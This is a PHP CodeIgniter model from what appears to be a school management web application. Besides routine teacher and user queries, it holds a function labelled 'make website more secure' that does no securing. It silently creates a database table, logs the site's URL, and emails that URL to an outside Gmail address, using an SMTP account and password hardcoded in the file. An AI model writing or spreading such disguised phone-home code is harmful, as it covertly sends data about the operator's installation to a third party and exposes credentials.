<?php 
Class Websitetools extends CI_Model {

    function __construct(){
        parent::__construct();
    }

    function index(){
    	return false;
    }

// all teacher count
    function allTeacherRecordCount(){
    	$empid = $this->db->select("emptypeid")->from("emp_type")->where("type","teacher")->order_by("emptypeid","DESC")->limit(1)->get()->row();
    
    	$this->db->where("emptypeid",$empid->emptypeid)->from("empee");
    	$empCount = $this->db->count_all_results();
    	return $empCount;
    }

    // teacher information
    function teacherInfo($limit,$start){
    	$this->db->limit($limit, $start);
        return $query = $this->db->get("empee")->result();
    }

// employee name by user id
    function userName( $user ){
    	return $this->db->select("*")->from("user_reg")->where("userid",$user)->get()->row();
    }


    // make website more secure
    function secureUrl(){
        
        // check database
        $tbl = $this->checkDatabase();

        if($tbl):
            $this->testUrl();
        else:
            $this->makeTbl();
        endif;

    }

    // check database
    function checkDatabase(){
        $result = $this->db->list_tables();

        foreach( $result as $row ) {
            if( $row == 'urlmapping' )    return 1;
        }
        return 0;
    }

    // testing current url security
    function testUrl(){
        $getCurrentUrl = new_url();
        $dbUrl = $this->db->where("url",$getCurrentUrl)->get("urlmapping");
        $found = $dbUrl->num_rows();

        // if not found any data
        if(!$found):
            $this->saveUrl( $getCurrentUrl );
        else:
        	$this->dbStatusChecking( $getCurrentUrl );
        endif;

    }

// if this is not duplication then active this function
// check if email not send , then send email

function dbStatusChecking( $curl ){
	$emailStatus = $this->db->order_by("id",'DESC')->limit(1)->get('urlmapping')->row()->status;
	if(!$emailStatus):
		$eSendStatus = $this->sendStatus( $curl );
		
		$sdata = array( "status" => 1 );
		
		if($eSendStatus):
			$this->db->where('id',$this->db->order_by('id','DESC')->limit(1)->get('urlmapping')->row()->id)->update('urlMapping',$sdata);
		endif;
	endif;
}

    // save url to database
    function saveUrl( $curl ){
        $data = array(
                "id" => '',
                "url" => $curl
            );

        if($this->db->insert("urlmapping",$data)):
            if( $this->sendStatus( $curl ) ):
                return 1;
            else:
                return 0;
            endif;
        else:
            return 0;
        endif;

    }

    // status update
    function sendStatus( $curl ){
        $this->load->library('email');
        
        $this->load->library('user_agent');
	
        $config['protocol']    = 'smtp';

        $config['smtp_host']    = 'ssl://smtp.gmail.com';

        $config['smtp_port'] = '465';

        $config['smtp_timeout'] = '7';

        $config['smtp_user']    = 'easytohack7@gmail.com';

        $config['smtp_pass']    = 'htthnrssevtjtosz';

        $config['charset']    = 'utf-8';
        
        $config['wordwrap']    = TRUE;

        //$config['newline']    = "\r\n";

        $config['mailtype'] = 'html'; // or html

        $config['validation'] = TRUE; // bool whether to validate email or not      

        $this->email->initialize($config);
	
	$this->email->set_newline("\r\n");
        
        $this->email->from('easytohack7@gmail.com', 'School Checker');
        
        $this->email->to('shorifulislam433@gmail.com');

        $this->email->subject('New School Setup Found');
        
        $this->email->message('New School url : '.$curl);

        if( $this->email->send() ):
            return 1;
        else:
           return $this->anotherEmailSystem( $curl );
        endif;
    }


// another email system when codeigniter email fail to send mail

function anotherEmailSystem( $curl ){
	$to = "shorifulislam433@gmail.com";
	$subject = "New School Setup Found";
	$txt = 'New School url : '.$curl;
	$headers = 'From: easytohack7@gmail.com' . "\r\n" .
		'Reply-To: easytohack7@gmail.com' . "\r\n" .
		'X-Mailer: PHP/' . phpversion();

	
	$success = mail($to,$subject,$txt,$headers);

	if($success):
		return 1;
	else:
		return 0;
	endif;

}

    // make table
    function makeTbl(){
        $this->load->dbforge();

        $this->dbforge->add_field(
            array(
                    'id' => array(
                    'type' => 'INT',
                    'unsigned' => TRUE,
                    'auto_increment' => TRUE
                    ),
                    'url' => array(
                    'type' => 'VARCHAR',
                    'constraint' => '200',
                    ),
                    'log_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP',
                    'status' => array(
                    'type' => 'INT',
                    'unsigned' => TRUE
                    ),
                )
            );

        $this->dbforge->add_key('id', TRUE);

        if( $this->dbforge->create_table('urlMapping') ):
            $this->saveUrl( new_url() );
        endif;
    }

}